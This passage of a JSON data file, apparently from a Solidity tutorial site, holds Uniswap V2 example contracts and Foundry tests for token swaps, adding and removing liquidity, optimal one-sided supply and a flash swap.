        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {\n    UniswapV2SwapExamples,\n    IERC20,\n    IWETH\n} from \"../../../src/defi/uniswap-v2/UniswapV2SwapExamples.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\ncontract UniswapV2SwapExamplesTest is Test {\n    IWETH private weth = IWETH(WETH);\n    IERC20 private dai = IERC20(DAI);\n    IERC20 private usdc = IERC20(USDC);\n\n    UniswapV2SwapExamples private uni = new UniswapV2SwapExamples();\n\n    function setUp() public {}\n\n    // Swap WETH -> DAI\n    function testSwapSingleHopExactAmountIn() public {\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        uint256 daiAmountMin = 1;\n        uint256 daiAmountOut =\n            uni.swapSingleHopExactAmountIn(wethAmount, daiAmountMin);\n\n        console2.log(\"DAI\", daiAmountOut);\n        assertGe(daiAmountOut, daiAmountMin, \"amount out < min\");\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function testSwapMultiHopExactAmountIn() public {\n        // Swap WETH -> DAI\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        uint256 daiAmountMin = 1;\n        uni.swapSingleHopExactAmountIn(wethAmount, daiAmountMin);\n\n        // Swap DAI -> WETH -> USDC\n        uint256 daiAmountIn = 1e18;\n        dai.approve(address(uni), daiAmountIn);\n\n        uint256 usdcAmountOutMin = 1;\n        uint256 usdcAmountOut =\n            uni.swapMultiHopExactAmountIn(daiAmountIn, usdcAmountOutMin);\n\n        console2.log(\"USDC\", usdcAmountOut);\n        assertGe(usdcAmountOut, usdcAmountOutMin, \"amount out < min\");\n    }\n\n    // Swap WETH -> DAI\n    function testSwapSingleHopExactAmountOut() public {\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        uint256 daiAmountDesired = 1e18;\n        uint256 daiAmountOut =\n            uni.swapSingleHopExactAmountOut(daiAmountDesired, wethAmount);\n\n        console2.log(\"DAI\", daiAmountOut);\n        assertEq(\n            daiAmountOut, daiAmountDesired, \"amount out != amount out desired\"\n        );\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function testSwapMultiHopExactAmountOut() public {\n        // Swap WETH -> DAI\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        // Buy 100 DAI\n        uint256 daiAmountOut = 100 * 1e18;\n        uni.swapSingleHopExactAmountOut(daiAmountOut, wethAmount);\n\n        // Swap DAI -> WETH -> USDC\n        dai.approve(address(uni), daiAmountOut);\n\n        uint256 amountOutDesired = 1e6;\n        uint256 amountOut =\n            uni.swapMultiHopExactAmountOut(amountOutDesired, daiAmountOut);\n\n        console2.log(\"USDC\", amountOut);\n        assertEq(\n            amountOut, amountOutDesired, \"amount out != amount out desired\"\n        );\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v2",
      "swap",
      "amm"
    ],
    "order": 0
  },
  {
    "slug": "uniswap-v2-add-remove-liquidity",
    "title": "Uniswap V2 Add Remove Liquidity",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V2 add remove liquidity",
    "content": "### Add / Remove Liquidity\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV2AddLiquidity {\n    address private constant FACTORY =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n    function addLiquidity(\n        address _tokenA,\n        address _tokenB,\n        uint256 _amountA,\n        uint256 _amountB\n    ) external {\n        safeTransferFrom(IERC20(_tokenA), msg.sender, address(this), _amountA);\n        safeTransferFrom(IERC20(_tokenB), msg.sender, address(this), _amountB);\n\n        safeApprove(IERC20(_tokenA), ROUTER, _amountA);\n        safeApprove(IERC20(_tokenB), ROUTER, _amountB);\n\n        (uint256 amountA, uint256 amountB, uint256 liquidity) = IUniswapV2Router(\n            ROUTER\n        ).addLiquidity(\n            _tokenA,\n            _tokenB,\n            _amountA,\n            _amountB,\n            1,\n            1,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function removeLiquidity(address _tokenA, address _tokenB) external {\n        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenA, _tokenB);\n\n        uint256 liquidity = IERC20(pair).balanceOf(address(this));\n        safeApprove(IERC20(pair), ROUTER, liquidity);\n\n        (uint256 amountA, uint256 amountB) = IUniswapV2Router(ROUTER)\n            .removeLiquidity(\n            _tokenA, _tokenB, liquidity, 1, 1, address(this), block.timestamp\n        );\n    }\n\n    /**\n     * @dev The transferFrom function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.transferFrom, (sender, recipient, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Transfer from fail\"\n        );\n    }\n\n    /**\n     * @dev The approve function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeApprove(IERC20 token, address spender, uint256 amount)\n        internal\n    {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.approve, (spender, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Approve fail\"\n        );\n    }\n}\n\ninterface IUniswapV2Router {\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 liquidity,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB);\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address token0, address token1)\n        external\n        view\n        returns (address);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```\n\n### Test with Foundry\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport\n    \"../../../src/defi/uniswap-v2-add-remove-liquidity/UniswapV2Liquidity.sol\";\n\nIERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\nIERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\nIERC20 constant PAIR = IERC20(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);\n\ncontract UniswapV2AddLiquidityTest is Test {\n    UniswapV2AddLiquidity private uni = new UniswapV2AddLiquidity();\n\n    //  Add WETH/USDT Liquidity to Uniswap\n    function testAddLiquidity() public {\n        // Deal test USDT and WETH to this contract\n        deal(address(USDT), address(this), 1e6 * 1e6);\n        assertEq(\n            USDT.balanceOf(address(this)), 1e6 * 1e6, \"USDT balance incorrect\"\n        );\n        deal(address(WETH), address(this), 1e6 * 1e18);\n        assertEq(\n            WETH.balanceOf(address(this)), 1e6 * 1e18, \"WETH balance incorrect\"\n        );\n\n        // Approve uni for transferring\n        safeApprove(WETH, address(uni), 1e64);\n        safeApprove(USDT, address(uni), 1e64);\n\n        uni.addLiquidity(address(WETH), address(USDT), 1 * 1e18, 3000.05 * 1e6);\n\n        assertGt(PAIR.balanceOf(address(uni)), 0, \"pair balance 0\");\n    }\n\n    // Remove WETH/USDT Liquidity from Uniswap\n    function testRemoveLiquidity() public {\n        // Deal LP tokens to uni\n        deal(address(PAIR), address(uni), 1e10);\n        assertEq(PAIR.balanceOf(address(uni)), 1e10, \"LP tokens balance = 0\");\n        assertEq(USDT.balanceOf(address(uni)), 0, \"USDT balance non-zero\");\n        assertEq(WETH.balanceOf(address(uni)), 0, \"WETH balance non-zero\");\n\n        uni.removeLiquidity(address(WETH), address(USDT));\n\n        assertEq(PAIR.balanceOf(address(uni)), 0, \"LP tokens balance != 0\");\n        assertGt(USDT.balanceOf(address(uni)), 0, \"USDT balance = 0\");\n        assertGt(WETH.balanceOf(address(uni)), 0, \"WETH balance = 0\");\n    }\n\n    /**\n     * @dev The transferFrom function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.transferFrom, (sender, recipient, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Transfer from fail\"\n        );\n    }\n\n    /**\n     * @dev The approve function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeApprove(IERC20 token, address spender, uint256 amount)\n        internal\n    {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.approve, (spender, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Approve fail\"\n        );\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV2Liquidity.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV2AddLiquidity {\n    address private constant FACTORY =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n    function addLiquidity(\n        address _tokenA,\n        address _tokenB,\n        uint256 _amountA,\n        uint256 _amountB\n    ) external {\n        safeTransferFrom(IERC20(_tokenA), msg.sender, address(this), _amountA);\n        safeTransferFrom(IERC20(_tokenB), msg.sender, address(this), _amountB);\n\n        safeApprove(IERC20(_tokenA), ROUTER, _amountA);\n        safeApprove(IERC20(_tokenB), ROUTER, _amountB);\n\n        (uint256 amountA, uint256 amountB, uint256 liquidity) = IUniswapV2Router(\n            ROUTER\n        ).addLiquidity(\n            _tokenA,\n            _tokenB,\n            _amountA,\n            _amountB,\n            1,\n            1,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function removeLiquidity(address _tokenA, address _tokenB) external {\n        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenA, _tokenB);\n\n        uint256 liquidity = IERC20(pair).balanceOf(address(this));\n        safeApprove(IERC20(pair), ROUTER, liquidity);\n\n        (uint256 amountA, uint256 amountB) = IUniswapV2Router(ROUTER)\n            .removeLiquidity(\n            _tokenA, _tokenB, liquidity, 1, 1, address(this), block.timestamp\n        );\n    }\n\n    /**\n     * @dev The transferFrom function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.transferFrom, (sender, recipient, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Transfer from fail\"\n        );\n    }\n\n    /**\n     * @dev The approve function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeApprove(IERC20 token, address spender, uint256 amount)\n        internal\n    {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.approve, (spender, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Approve fail\"\n        );\n    }\n}\n\ninterface IUniswapV2Router {\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 liquidity,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB);\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address token0, address token1)\n        external\n        view\n        returns (address);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      },
      {
        "fileName": "UniswapV2LiquidityTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport\n    \"../../../src/defi/uniswap-v2-add-remove-liquidity/UniswapV2Liquidity.sol\";\n\nIERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\nIERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\nIERC20 constant PAIR = IERC20(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);\n\ncontract UniswapV2AddLiquidityTest is Test {\n    UniswapV2AddLiquidity private uni = new UniswapV2AddLiquidity();\n\n    //  Add WETH/USDT Liquidity to Uniswap\n    function testAddLiquidity() public {\n        // Deal test USDT and WETH to this contract\n        deal(address(USDT), address(this), 1e6 * 1e6);\n        assertEq(\n            USDT.balanceOf(address(this)), 1e6 * 1e6, \"USDT balance incorrect\"\n        );\n        deal(address(WETH), address(this), 1e6 * 1e18);\n        assertEq(\n            WETH.balanceOf(address(this)), 1e6 * 1e18, \"WETH balance incorrect\"\n        );\n\n        // Approve uni for transferring\n        safeApprove(WETH, address(uni), 1e64);\n        safeApprove(USDT, address(uni), 1e64);\n\n        uni.addLiquidity(address(WETH), address(USDT), 1 * 1e18, 3000.05 * 1e6);\n\n        assertGt(PAIR.balanceOf(address(uni)), 0, \"pair balance 0\");\n    }\n\n    // Remove WETH/USDT Liquidity from Uniswap\n    function testRemoveLiquidity() public {\n        // Deal LP tokens to uni\n        deal(address(PAIR), address(uni), 1e10);\n        assertEq(PAIR.balanceOf(address(uni)), 1e10, \"LP tokens balance = 0\");\n        assertEq(USDT.balanceOf(address(uni)), 0, \"USDT balance non-zero\");\n        assertEq(WETH.balanceOf(address(uni)), 0, \"WETH balance non-zero\");\n\n        uni.removeLiquidity(address(WETH), address(USDT));\n\n        assertEq(PAIR.balanceOf(address(uni)), 0, \"LP tokens balance != 0\");\n        assertGt(USDT.balanceOf(address(uni)), 0, \"USDT balance = 0\");\n        assertGt(WETH.balanceOf(address(uni)), 0, \"WETH balance = 0\");\n    }\n\n    /**\n     * @dev The transferFrom function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.transferFrom, (sender, recipient, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Transfer from fail\"\n        );\n    }\n\n    /**\n     * @dev The approve function may or may not return a bool.\n     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.\n     * Need to check if data is empty or true.\n     */\n    function safeApprove(IERC20 token, address spender, uint256 amount)\n        internal\n    {\n        (bool success, bytes memory returnData) = address(token).call(\n            abi.encodeCall(IERC20.approve, (spender, amount))\n        );\n        require(\n            success\n                && (returnData.length == 0 || abi.decode(returnData, (bool))),\n            \"Approve fail\"\n        );\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v2",
      "add",
      "remove",
      "liquidity",
      "amm"
    ],
    "order": 1
  },
  {
    "slug": "uniswap-v2-optimal-one-sided-supply",
    "title": "Uniswap V2 Optimal One Sided Supply",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V2 Optimal One Sided Supply",
    "content": "### Optimal One Sided Supply\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TestUniswapOptimalOneSidedSupply {\n    address private constant FACTORY =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function sqrt(uint256 y) private pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n\n    /*\n    s = optimal swap amount\n    r = amount of reserve for token a\n    a = amount of token a the user currently has (not added to reserve yet)\n    f = swap fee percent\n    s = (sqrt(((2 - f)r)^2 + 4(1 - f)ar) - (2 - f)r) / (2(1 - f))\n    */\n    function getSwapAmount(uint256 r, uint256 a)\n        public\n        pure\n        returns (uint256)\n    {\n        return (sqrt(r * (r * 3988009 + a * 3988000)) - r * 1997) / 1994;\n    }\n\n    /* Optimal one-sided supply\n    1. Swap optimal amount from token A to token B\n    2. Add liquidity\n    */\n    function zap(address _tokenA, address _tokenB, uint256 _amountA) external {\n        require(_tokenA == WETH || _tokenB == WETH, \"!weth\");\n\n        IERC20(_tokenA).transferFrom(msg.sender, address(this), _amountA);\n\n        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenA, _tokenB);\n        (uint256 reserve0, uint256 reserve1,) =\n            IUniswapV2Pair(pair).getReserves();\n\n        uint256 swapAmount;\n        if (IUniswapV2Pair(pair).token0() == _tokenA) {\n            // swap from token0 to token1\n            swapAmount = getSwapAmount(reserve0, _amountA);\n        } else {\n            // swap from token1 to token0\n            swapAmount = getSwapAmount(reserve1, _amountA);\n        }\n\n        _swap(_tokenA, _tokenB, swapAmount);\n        _addLiquidity(_tokenA, _tokenB);\n    }\n\n    function _swap(address _from, address _to, uint256 _amount) internal {\n        IERC20(_from).approve(ROUTER, _amount);\n\n        address[] memory path = new address[](2);\n        path = new address[](2);\n        path[0] = _from;\n        path[1] = _to;\n\n        IUniswapV2Router(ROUTER).swapExactTokensForTokens(\n            _amount, 1, path, address(this), block.timestamp\n        );\n    }\n\n    function _addLiquidity(address _tokenA, address _tokenB) internal {\n        uint256 balA = IERC20(_tokenA).balanceOf(address(this));\n        uint256 balB = IERC20(_tokenB).balanceOf(address(this));\n        IERC20(_tokenA).approve(ROUTER, balA);\n        IERC20(_tokenB).approve(ROUTER, balB);\n\n        IUniswapV2Router(ROUTER).addLiquidity(\n            _tokenA, _tokenB, balA, balB, 0, 0, address(this), block.timestamp\n        );\n    }\n}\n\ninterface IUniswapV2Router {\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address token0, address token1)\n        external\n        view\n        returns (address);\n}\n\ninterface IUniswapV2Pair {\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "Optimal.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TestUniswapOptimalOneSidedSupply {\n    address private constant FACTORY =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function sqrt(uint256 y) private pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n\n    /*\n    s = optimal swap amount\n    r = amount of reserve for token a\n    a = amount of token a the user currently has (not added to reserve yet)\n    f = swap fee percent\n    s = (sqrt(((2 - f)r)^2 + 4(1 - f)ar) - (2 - f)r) / (2(1 - f))\n    */\n    function getSwapAmount(uint256 r, uint256 a)\n        public\n        pure\n        returns (uint256)\n    {\n        return (sqrt(r * (r * 3988009 + a * 3988000)) - r * 1997) / 1994;\n    }\n\n    /* Optimal one-sided supply\n    1. Swap optimal amount from token A to token B\n    2. Add liquidity\n    */\n    function zap(address _tokenA, address _tokenB, uint256 _amountA) external {\n        require(_tokenA == WETH || _tokenB == WETH, \"!weth\");\n\n        IERC20(_tokenA).transferFrom(msg.sender, address(this), _amountA);\n\n        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenA, _tokenB);\n        (uint256 reserve0, uint256 reserve1,) =\n            IUniswapV2Pair(pair).getReserves();\n\n        uint256 swapAmount;\n        if (IUniswapV2Pair(pair).token0() == _tokenA) {\n            // swap from token0 to token1\n            swapAmount = getSwapAmount(reserve0, _amountA);\n        } else {\n            // swap from token1 to token0\n            swapAmount = getSwapAmount(reserve1, _amountA);\n        }\n\n        _swap(_tokenA, _tokenB, swapAmount);\n        _addLiquidity(_tokenA, _tokenB);\n    }\n\n    function _swap(address _from, address _to, uint256 _amount) internal {\n        IERC20(_from).approve(ROUTER, _amount);\n\n        address[] memory path = new address[](2);\n        path = new address[](2);\n        path[0] = _from;\n        path[1] = _to;\n\n        IUniswapV2Router(ROUTER).swapExactTokensForTokens(\n            _amount, 1, path, address(this), block.timestamp\n        );\n    }\n\n    function _addLiquidity(address _tokenA, address _tokenB) internal {\n        uint256 balA = IERC20(_tokenA).balanceOf(address(this));\n        uint256 balB = IERC20(_tokenB).balanceOf(address(this));\n        IERC20(_tokenA).approve(ROUTER, balA);\n        IERC20(_tokenB).approve(ROUTER, balB);\n\n        IUniswapV2Router(ROUTER).addLiquidity(\n            _tokenA, _tokenB, balA, balB, 0, 0, address(this), block.timestamp\n        );\n    }\n}\n\ninterface IUniswapV2Router {\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address token0, address token1)\n        external\n        view\n        returns (address);\n}\n\ninterface IUniswapV2Pair {\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v2",
      "optimal",
      "one",
      "sided",
      "supply",
      "amm"
    ],
    "order": 2
  },
  {
    "slug": "uniswap-v2-flash-swap",
    "title": "Uniswap V2 Flash Swap",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V2 flash swap",
    "content": "### Uniswap V2 Flash Swap Example\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IUniswapV2Callee {\n    function uniswapV2Call(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ncontract UniswapV2FlashSwap is IUniswapV2Callee {\n    address private constant UNISWAP_V2_FACTORY =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    IUniswapV2Factory private constant factory =\n        IUniswapV2Factory(UNISWAP_V2_FACTORY);\n\n    IERC20 private constant weth = IERC20(WETH);\n\n    IUniswapV2Pair private immutable pair;\n\n    // For this example, store the amount to repay\n    uint256 public amountToRepay;\n\n    constructor() {\n        pair = IUniswapV2Pair(factory.getPair(DAI, WETH));\n    }\n\n    function flashSwap(uint256 wethAmount) external {\n        // Need to pass some data to trigger uniswapV2Call\n        bytes memory data = abi.encode(WETH, msg.sender);\n\n        // amount0Out is DAI, amount1Out is WETH\n        pair.swap(0, wethAmount, address(this), data);\n    }\n\n    // This function is called by the DAI/WETH pair contract\n    function uniswapV2Call(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external {\n        require(msg.sender == address(pair), \"not pair\");\n        require(sender == address(this), \"not sender\");\n\n        (address tokenBorrow, address caller) =\n            abi.decode(data, (address, address));\n\n        // Your custom code would go here. For example, code to arbitrage.\n        require(tokenBorrow == WETH, \"token borrow != WETH\");\n\n        // about 0.3% fee, +1 to round up\n        uint256 fee = (amount1 * 3) / 997 + 1;\n        amountToRepay = amount1 + fee;\n\n        // Transfer flash swap fee from caller\n        weth.transferFrom(caller, address(this), fee);\n\n        // Repay\n        weth.transfer(address(pair), amountToRepay);\n    }\n}\n\ninterface IUniswapV2Pair {\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\n```\n\n### Test with Foundry\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v2-flash-swap/UniswapV2FlashSwap.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\ncontract UniswapV2FlashSwapTest is Test {\n    IWETH private weth = IWETH(WETH);\n\n    UniswapV2FlashSwap private uni = new UniswapV2FlashSwap();\n\n    function setUp() public {}\n\n    function testFlashSwap() public {\n        weth.deposit{value: 1e18}();\n        // Approve flash swap fee\n        weth.approve(address(uni), 1e18);\n\n        uint256 amountToBorrow = 10 * 1e18;\n        uni.flashSwap(amountToBorrow);\n\n        assertGt(uni.amountToRepay(), amountToBorrow);\n    }\n}\n\n```\n\n### Links\n\n<a href=\"https://github.com/foundry-rs/foundry\" target=\"__blank\">Foundry</a>\n\n<a href=\"https://github.com/t4sk/defi-notes\" target=\"__blank\">Uniswap V3 Foundry example</a>",
    "codes": [
      {
